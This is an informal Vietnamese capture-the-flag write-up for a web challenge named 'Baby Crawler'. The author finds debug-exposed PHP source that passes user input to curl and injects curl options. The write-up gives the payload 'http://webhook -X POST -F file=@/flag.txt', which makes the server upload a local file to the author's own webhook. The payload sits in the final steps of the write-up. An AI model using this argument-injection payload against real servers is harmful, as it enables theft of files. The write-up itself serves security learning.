- tiêu đề : Baby Crawler = baby cute 
- nội dung : chả có cái me gì 

- trước tiên thì mình view và dùng thử tính năng của web 
- cảm giác nó đang curl lấy dữ liệu của web mình nhập vào và lưu ở cái ./cache/oằn tà là vằn 

![Alt text](<../image/15.1.png>)

- mình mở f12 lên đọc thử thấy có comment ?debug :> nghi nghi òi 
- và thử thêm ?debug vào pem có ngay source 

![Alt text](<../image/15.2.png>)

- uhm đoạn source này quan trọng mỗi từ if(isset)... 
- đọc thì mình thấy họ đang curl + userinput ( đã được escapeshellcmd nên không nối dài để cmdi được nha )
- thì curl ròi thì lợi dụng thoi 
- mình curl thử đến webhook của mình và thấy thành công nhận được gói tin 
- giờ test chút để bypass thằng strpos($url ,'http') vì nếu http không ở đầu là sai luôn nhé 

![Alt text](<../image/15.3.png>)

- okay mình thấy để -F ra sau cũng không vấn đề gì và bỏ "" ở đường dẫn sau @ cũng không vấn đề gì 
- giờ pem lệnh http://webhook -X POST -F file=@/flag.txt 

![Alt text](<../image/15.4.png>)
- download về mở hoi 
![Alt text](<../image/15.5.png>)

- và lụm cờ lụm cờ 

#hackerga2101: